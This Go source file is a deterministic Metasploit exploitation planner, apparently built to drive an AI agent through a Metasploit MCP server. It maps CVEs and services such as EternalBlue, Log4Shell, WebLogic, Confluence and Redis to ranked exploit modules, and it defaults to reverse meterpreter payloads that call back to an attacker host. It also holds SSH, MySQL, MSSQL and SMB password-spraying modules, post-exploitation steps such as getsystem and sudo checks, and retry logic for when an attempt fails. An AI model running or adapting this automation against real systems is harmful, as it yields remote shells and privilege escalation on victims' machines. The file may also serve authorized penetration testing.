// Package msf is the deterministic Metasploit exploitation decision layer.
//
// It answers three questions without any LLM:
//   - which modules should be tried for a given vulnerability class / target
//   - which options and preconditions each attempt needs
//   - what to do when an attempt fails (next candidate / degrade / stop)
//
// The plan is a pure function of its input (stable PlanID), so planner and worker
// can recompute the same plan after a restart without server-side state. Execution
// itself happens through the Metasploit MCP server; this package never shells out.
package msf

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/url"
	"strconv"
	"strings"
)

// Outcome is the observed result of one attempt (one candidate index).
type Outcome string

const (
	OutcomeSession        Outcome = "session"         // a new Metasploit session appeared
	OutcomeNoSession      Outcome = "no_session"      // module ran, no session
	OutcomeError          Outcome = "error"           // RPC/module error
	OutcomeModuleMissing  Outcome = "module_missing"  // module not found in this MSF install
	OutcomePrecheckFailed Outcome = "precheck_failed" // precondition check failed before exploit
)

// Input describes one vuln → target pairing. Only host is required; the more
// context is present the fewer runtime checks remain.
type Input struct {
	VulnClass string `json:"vuln_class"`
	Product   string `json:"product,omitempty"`
	Version   string `json:"version,omitempty"`
	Host      string `json:"host"`
	Port      int    `json:"port,omitempty"`
	Service   string `json:"service,omitempty"`
	URL       string `json:"url,omitempty"`
	SSL       *bool  `json:"ssl,omitempty"`
	LHOST     string `json:"lhost,omitempty"`
	LPORT     int    `json:"lport,omitempty"`
}

// Candidate is one deterministic exploit attempt.
type Candidate struct {
	Order      int               `json:"order"`
	ModuleType string            `json:"module_type"`
	Module     string            `json:"module"`
	Payload    string            `json:"payload,omitempty"`
	Options    map[string]string `json:"options"`
	Confidence int               `json:"confidence"`
	Rationale  string            `json:"rationale"`
	Verify     []string          `json:"verify,omitempty"`
}

// Branch documents a failure transition. The same table is enforced by Next.
type Branch struct {
	On   string `json:"on"`
	Do   string `json:"do"`
	Note string `json:"note,omitempty"`
}

// Plan is the complete, deterministic decision result.
type Plan struct {
	PlanID          string      `json:"plan_id"`
	Kind            string      `json:"kind"` // exploit | search
	Class           string      `json:"class"`
	Summary         string      `json:"summary"`
	Candidates      []Candidate `json:"candidates"`
	Preconditions   []string    `json:"preconditions"`
	Branches        []Branch    `json:"branches"`
	SessionPost     []string    `json:"session_post,omitempty"`
	SuggestedSearch string      `json:"suggested_search,omitempty"`
	Warnings        []string    `json:"warnings,omitempty"`
}

// Action is the next step Next returns.
type Action struct {
	Kind           string     `json:"kind"` // execute | retry | session | degrade | stop
	CandidateIndex int        `json:"candidate_index,omitempty"`
	Candidate      *Candidate `json:"candidate,omitempty"`
	Message        string     `json:"message"`
	PostSteps      []string   `json:"post_steps,omitempty"`
}

// ErrNoPlan means the vulnerability class has no built-in mapping.
type ErrNoPlan struct {
	Class   string
	Search  string
	Message string
}

func (e *ErrNoPlan) Error() string { return e.Message }

// category keywords, lower-case. First hit wins.
var classKeywords = []struct {
	class string
	words []string
}{
	{"eternalblue", []string{"eternalblue", "ms17-010", "ms17010", "cve-2017-0143", "cve-2017-0144"}},
	{"bluekeep", []string{"bluekeep", "cve-2019-0708"}},
	{"log4j", []string{"log4j", "log4shell", "cve-2021-44228", "cve-2021-45046"}},
	{"struts2", []string{"struts", "s2-0", "s2-dev"}},
	{"weblogic", []string{"weblogic", "cve-2020-14882", "cve-2020-14883", "cve-2019-2725", "cve-2018-2628"}},
	{"tomcat", []string{"tomcat", "cve-2017-12615", "cve-2020-1938", "ghostcat"}},
	{"spring", []string{"spring4shell", "spring_framework", "spring cloud", "cve-2022-22965", "cve-2022-22947"}},
	{"jenkins", []string{"jenkins", "cve-2018-1000861", "cve-2019-1003000"}},
	{"shiro", []string{"shiro", "cve-2016-4437"}},
	{"activemq", []string{"activemq", "cve-2016-3088", "cve-2023-46604"}},
	{"solr", []string{"solr", "cve-2019-17558", "cve-2017-12629"}},
	{"confluence", []string{"confluence", "cve-2022-26134", "cve-2021-26084", "cve-2023-22515"}},
	{"gitlab", []string{"gitlab", "cve-2021-22205"}},
	{"vsftpd", []string{"vsftpd", "cve-2011-2523"}},
	{"redis", []string{"redis unauthorized", "redis未授权", "redis 未授权", "redis"}},
	{"rdp", []string{"rdp", "3389"}},
	{"smb", []string{"smb", "445"}},
	{"ssh", []string{"ssh weak", "ssh 弱口令", "ssh弱口令", "ssh"}},
	{"mysql", []string{"mysql weak", "mysql 弱口令", "mysql弱口令", "mysql"}},
	{"mssql", []string{"mssql", "sqlserver", "1433"}},
	{"jenkins", []string{"jenkins"}},
}

// NormalizeClass maps a free-text vuln class / product / CVE to a catalog key.
func NormalizeClass(s string) string {
	t := strings.ToLower(strings.TrimSpace(s))
	if t == "" {
		return ""
	}
	for _, kw := range classKeywords {
		for _, w := range kw.words {
			if strings.Contains(t, w) {
				return kw.class
			}
		}
	}
	return ""
}

// defaultReversePayload picks the payload family for the target OS implied by class.
func defaultReversePayload(class string) string {
	switch class {
	case "eternalblue", "bluekeep", "smb", "rdp", "mssql":
		return "windows/x64/meterpreter/reverse_tcp"
	case "vsftpd":
		return "cmd/unix/interact"
	default:
		return "linux/x64/meterpreter/reverse_tcp"
	}
}

// cand is the static catalog shape; options are completed at Build time.
type cand struct {
	moduleType string
	module     string
	payload    string
	confidence int
	rationale  string
	extra      map[string]string
	verify     []string
}

var catalog = map[string][]cand{
	"struts2": {
		{"exploit", "exploit/multi/http/struts2_content_type_ognl", "", 80,
			"Content-Type OGNL 注入，覆盖 S2-045/S2-046 系", map[string]string{"TARGETURI": "/"}, []string{"模块存在性", "目标返回 200 且带 Struts 特征"}},
		{"exploit", "exploit/multi/http/struts2_rest_xstream", "", 72,
			"REST 插件 XStream 反序列化（S2-052）", map[string]string{"TARGETURI": "/orders/3"}, nil},
		{"exploit", "exploit/multi/http/struts2_namespace_ognl", "", 68,
			"namespace OGNL 注入（S2-057）", nil, nil},
		{"exploit", "exploit/multi/http/struts2_devmode", "", 55,
			"devMode 远程命令执行（S2-013 系）", map[string]string{"TARGETURI": "/"}, nil},
	},
	"log4j": {
		{"exploit", "exploit/multi/http/log4shell_header_injection", "", 82,
			"Log4Shell JNDI 注入，需目标可回连 LDAP 服务", map[string]string{"TARGETURI": "/"}, []string{"目标出网可达 LHOST", "存在可注入 header"}},
	},
	"weblogic": {
		{"exploit", "exploit/multi/http/weblogic_admin_handle_rce", "", 78,
			"admin handle 未授权 RCE（CVE-2020-14882/14883）", map[string]string{"TARGETURI": "/console/css/%252e%252e%252fconsole.portal"}, nil},
		{"exploit", "exploit/multi/http/weblogic_deserialize_asyncresponseservice", "", 65,
			"AsyncResponseService 反序列化（CVE-2019-2725）", nil, nil},
		{"exploit", "exploit/multi/http/weblogic_deserialize_marshalledobject", "", 55,
			"MarshalObject 反序列化（CVE-2018-2628）", nil, nil},
	},
	"tomcat": {
		{"exploit", "exploit/multi/http/tomcat_mgr_upload", "", 70,
			"Tomcat Manager 弱口令 war 部署", nil, []string{"manager 路径可达", "需要 manager 凭据"}},
		{"exploit", "exploit/multi/http/tomcat_jsp_upload_bypass", "", 60,
			"JSP 上传绕过（CVE-2017-12615）", nil, nil},
		{"exploit", "exploit/multi/http/ghostcat_tomcat_ajp", "", 50,
			"AJP Ghostcat 文件读取/包含（CVE-2020-1938）", map[string]string{"RPORT": "8009"}, nil},
	},
	"spring": {
		{"exploit", "exploit/multi/http/spring_framework_rce_spring4shell", "", 75,
			"Spring4Shell（CVE-2022-22965）", map[string]string{"TARGETURI": "/"}, nil},
		{"exploit", "exploit/multi/http/spring_cloud_gateway_rce", "", 65,
			"Spring Cloud Gateway Actuator RCE（CVE-2022-22947）", map[string]string{"TARGETURI": "/actuator"}, nil},
	},
	"jenkins": {
		{"exploit", "exploit/multi/http/jenkins_script_console", "", 70,
			"脚本控制台未授权/弱口令执行", map[string]string{"TARGETURI": "/script"}, nil},
		{"exploit", "exploit/multi/http/jenkins_cli_deserialization", "", 55,
			"Jenkins CLI 反序列化（CVE-2017-1000353）", nil, nil},
	},
	"shiro": {
		{"exploit", "exploit/multi/http/shiro_rememberme_v124_deserialize", "", 70,
			"rememberMe 反序列化（CVE-2016-4437）", map[string]string{"TARGETURI": "/"}, []string{"需要可用 gadget 链"}},
	},
	"activemq": {
		{"exploit", "exploit/multi/http/apache_activemq_upload_jsp", "", 70,
			"fileserver 任意文件写 JSP（CVE-2016-3088）", map[string]string{"TARGETURI": "/"}, nil},
	},
	"solr": {
		{"exploit", "exploit/linux/http/apache_solr_rce", "", 62,
			"Solr Velocity/Config API RCE", map[string]string{"TARGETURI": "/solr/"}, nil},
	},
	"confluence": {
		{"exploit", "exploit/multi/http/confluence_widget_connector_rce", "", 68,
			"Widget Connector OGNL（CVE-2019-3396）", nil, nil},
		{"exploit", "exploit/multi/http/atlassian_confluence_ognl_injection", "", 62,
			"OGNL 注入（CVE-2022-26134/2023-22527）", nil, nil},
	},
	"eternalblue": {
		{"exploit", "exploit/windows/smb/ms17_010_eternalblue", "", 85,
			"MS17-010 SMBv1 远程内核 RCE", map[string]string{"RPORT": "445"}, []string{"445 开放", "SMBv1 可用", "目标未打补丁"}},
		{"exploit", "exploit/windows/smb/ms17_010_psexec", "", 60,
			"MS17-010 经 PsExec 路径（无需内核 shellcode）", map[string]string{"RPORT": "445"}, nil},
	},
	"bluekeep": {
		{"exploit", "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "", 70,
			"RDP 内核 UAF（CVE-2019-0708），目标版本受限", map[string]string{"RPORT": "3389"}, []string{"目标为 Win7/2008 且未打补丁", "需要目标架构匹配"}},
	},
	"vsftpd": {
		{"exploit", "exploit/unix/ftp/vsftpd_234_backdoor", "", 80,
			"vsftpd 2.3.4 笑脸后门", map[string]string{"RPORT": "21"}, []string{"banner 含 vsftpd 2.3.4"}},
	},
	"redis": {
		{"exploit", "exploit/linux/redis/redis_replication_cmd_exec", "", 65,
			"Redis 主从复制 RCE（未授权）", map[string]string{"RPORT": "6379"}, []string{"6379 未授权", "可执行 SLAVEOF/MODULE"}},
		{"exploit", "exploit/linux/redis/redis_unauth_exec", "", 55,
			"Redis 未授权写 crontab/SSH key", map[string]string{"RPORT": "6379"}, nil},
	},
	"ssh": {
		{"auxiliary", "auxiliary/scanner/ssh/ssh_login", "", 60,
			"SSH 口令喷洒（需要用户名/字典，非 RCE）", map[string]string{"RPORT": "22"}, []string{"需要凭据字典"}},
	},
	"mysql": {
		{"auxiliary", "auxiliary/scanner/mysql/mysql_login", "", 60,
			"MySQL 口令喷洒（需要用户名/字典）", map[string]string{"RPORT": "3306"}, []string{"需要凭据字典"}},
	},
	"mssql": {
		{"auxiliary", "auxiliary/scanner/mssql/mssql_login", "", 55,
			"MSSQL 口令喷洒（需要用户名/字典）", map[string]string{"RPORT": "1433"}, nil},
	},
	"smb": {
		{"auxiliary", "auxiliary/scanner/smb/smb_login", "", 55,
			"SMB 口令喷洒（需要用户名/字典）", map[string]string{"RPORT": "445"}, nil},
	},
}

// Build computes the deterministic plan. It never performs I/O.
func Build(in Input) (Plan, error) {
	if strings.TrimSpace(in.Host) == "" {
		return Plan{}, fmt.Errorf("host 必填")
	}
	class := NormalizeClass(in.VulnClass + " " + in.Product + " " + in.Service)
	// Service-only hints (no explicit class) still map to credential modules.
	if class == "" && in.VulnClass != "" {
		class = NormalizeClass(in.VulnClass)
	}
	if class == "" {
		search := strings.TrimSpace(strings.Join(nonEmpty(in.VulnClass, in.Product, in.Version, in.Service), " "))
		if search == "" {
			search = in.Host
		}
		return Plan{}, &ErrNoPlan{
			Class:  in.VulnClass,
			Search: search,
			Message: "没有内置的确定性利用路径；请先用 search_modules 以「" + search +
				"」检索，确认模块后用 use_module/execute_module 手工执行，并把结果写回 fact。",
		}
	}

	entries := catalog[class]
	lport := in.LPORT
	if lport == 0 {
		lport = 4444
	}
	base := baseOptions(in)

	cands := make([]Candidate, 0, len(entries))
	for i, e := range entries {
		opts := cloneMap(base)
		for k, v := range e.extra {
			// TARGETURI from the real URL wins over the module's default path;
			// everything else (e.g. a module-specific RPORT) is authoritative.
			if k == "TARGETURI" {
				if _, ok := opts[k]; ok {
					continue
				}
			}
			opts[k] = v
		}
		payload := e.payload
		if payload == "" && e.moduleType == "exploit" {
			payload = defaultReversePayload(class)
		}
		if payload != "" {
			opts["PAYLOAD"] = payload
		}
		cands = append(cands, Candidate{
			Order:      i + 1,
			ModuleType: e.moduleType,
			Module:     e.module,
			Payload:    payload,
			Options:    opts,
			Confidence: e.confidence,
			Rationale:  e.rationale,
			Verify:     e.verify,
		})
	}

	p := Plan{
		Kind:       "exploit",
		Class:      class,
		Summary:    fmt.Sprintf("%s → %s:%d，共 %d 个候选模块（确定性顺序）", class, in.Host, portOf(in), len(cands)),
		Candidates: cands,
	}
	p.Preconditions = preconditions(p, in, lport)
	p.Branches = []Branch{
		{"module_missing", "retry_next", "当前 MSF 安装没有该模块，换下一候选"},
		{"precheck_failed", "degrade", "前置条件不满足：不要硬打，改用 check/辅助验证并写回否定 fact"},
		{"no_session", "retry_next", "模块执行完但无新会话，换下一候选（不同利用面/payload）"},
		{"error", "retry_next", "RPC/模块报错，记录错误后换下一候选；连续失败则 stop"},
		{"session", "post_session", "拿到会话：先执行 session_post 取证命令，再写回 fact 并登记 ARTEX 会话"},
		{"exhausted", "stop", "候选耗尽：写回否定 fact（已尝试模块 + 失败原因），不要重复同一路径"},
	}
	p.SessionPost = []string{
		"sysinfo / whoami（确认权限与主机身份）",
		"getuid / getsystem（Windows）或 id / sudo -n -l（Linux）",
		"ipconfig / ifconfig（确认可达网段，供内网拓扑）",
		"把 session id、主机、权限写回 fact（vulnclass=msf_session）",
	}
	if needsCallback(p) {
		if strings.TrimSpace(in.LHOST) == "" {
			p.Warnings = append(p.Warnings, "使用了反弹 payload 但未提供 lhost：执行前必须补 LHOST，否则目标无法回连")
		} else if lport <= 0 || lport > 65535 {
			p.Warnings = append(p.Warnings, "lport 非法（1-65535）")
		}
	}
	p.PlanID = planID(class, in, cands)
	return p, nil
}

func nonEmpty(ss ...string) []string {
	out := make([]string, 0, len(ss))
	for _, s := range ss {
		if strings.TrimSpace(s) != "" {
			out = append(out, strings.TrimSpace(s))
		}
	}
	return out
}

func cloneMap(m map[string]string) map[string]string {
	o := make(map[string]string, len(m))
	for k, v := range m {
		o[k] = v
	}
	return o
}

func portOf(in Input) int {
	if in.Port > 0 {
		return in.Port
	}
	switch strings.ToLower(in.Service) {
	case "https":
		return 443
	case "http":
		return 80
	case "ssh":
		return 22
	case "ftp":
		return 21
	case "smb":
		return 445
	case "rdp":
		return 3389
	case "redis":
		return 6379
	case "mysql":
		return 3306
	case "mssql":
		return 1433
	}
	return 80
}

func baseOptions(in Input) map[string]string {
	opts := map[string]string{
		"RHOSTS": in.Host,
		"RPORT":  strconv.Itoa(portOf(in)),
	}
	ssl := portOf(in) == 443 || strings.HasPrefix(strings.ToLower(in.URL), "https://")
	if in.SSL != nil {
		ssl = *in.SSL
	}
	if ssl {
		opts["SSL"] = "true"
	}
	if in.URL != "" {
		if u, err := url.Parse(in.URL); err == nil && u.Path != "" && u.Path != "/" {
			opts["TARGETURI"] = u.Path
		}
	}
	if in.LHOST != "" {
		opts["LHOST"] = in.LHOST
	}
	return opts
}

func needsCallback(p Plan) bool {
	for _, c := range p.Candidates {
		if strings.HasSuffix(c.Payload, "/reverse_tcp") || strings.Contains(c.Payload, "reverse_") {
			return true
		}
	}
	return false
}

func preconditions(p Plan, in Input, lport int) []string {
	pre := []string{
		fmt.Sprintf("port_open:%s:%d", in.Host, portOf(in)),
		"module_exists: 每个候选执行前先 get_module_info 确认（缺失走 module_missing 分支）",
	}
	if in.Service != "" {
		pre = append(pre, "service_match:"+in.Service)
	}
	if needsCallback(p) {
		if in.LHOST != "" {
			pre = append(pre, fmt.Sprintf("callback_reachable:%s:%d（目标需能主动回连）", in.LHOST, lport))
		} else {
			pre = append(pre, "callback_reachable: 未提供 LHOST，执行前必须补充")
		}
	}
	if len(p.Candidates) > 0 && p.Candidates[0].ModuleType == "auxiliary" {
		pre = append(pre, "credentials: 口令类模块需要用户名/字典，缺失时不要空跑")
	}
	return pre
}

func planID(class string, in Input, cands []Candidate) string {
	var b strings.Builder
	b.WriteString(class)
	b.WriteString("|")
	b.WriteString(in.Host)
	b.WriteString("|")
	b.WriteString(strconv.Itoa(portOf(in)))
	b.WriteString("|")
	b.WriteString(in.LHOST)
	for _, c := range cands {
		b.WriteString("|")
		b.WriteString(c.Module)
		b.WriteString(":")
		b.WriteString(c.Payload)
	}
	sum := sha256.Sum256([]byte(b.String()))
	return "msf-" + hex.EncodeToString(sum[:6])
}

// Next computes the deterministic next action after attempt `idx` (0-based)
// produced `out`. It is total: every input yields an action.
func Next(p Plan, idx int, out Outcome) Action {
	if len(p.Candidates) == 0 {
		return Action{Kind: "stop", Message: "没有候选模块；先 search_modules 检索并人工确认路径"}
	}
	if idx < 0 {
		idx = 0
	}
	cur := p.Candidates[idx]
	next := func(reason string) Action {
		if idx+1 < len(p.Candidates) {
			c := p.Candidates[idx+1]
			return Action{
				Kind:           "retry",
				CandidateIndex: idx + 1,
				Candidate:      &c,
				Message:        fmt.Sprintf("%s；切换到候选 #%d %s", reason, c.Order, c.Module),
			}
		}
		return Action{
			Kind:    "stop",
			Message: reason + "；候选已耗尽。写回否定 fact（模块、参数、失败原因），不要重复同一路径。",
		}
	}

	switch out {
	case OutcomeSession:
		return Action{
			Kind:      "session",
			Message:   fmt.Sprintf("%s 已获得会话。先按 session_post 取证，再登记 ARTEX 会话并写回 fact。", cur.Module),
			PostSteps: p.SessionPost,
		}
	case OutcomeModuleMissing:
		return next("当前 MSF 安装缺少该模块")
	case OutcomePrecheckFailed:
		return Action{
			Kind:    "degrade",
			Message: fmt.Sprintf("%s 的前置条件不满足。不要硬打；改用 check/辅助模块验证，并把否定结论写回 fact。", cur.Module),
		}
	case OutcomeNoSession:
		return next("模块执行完成但未产生新会话")
	default:
		return next("执行报错")
	}
}
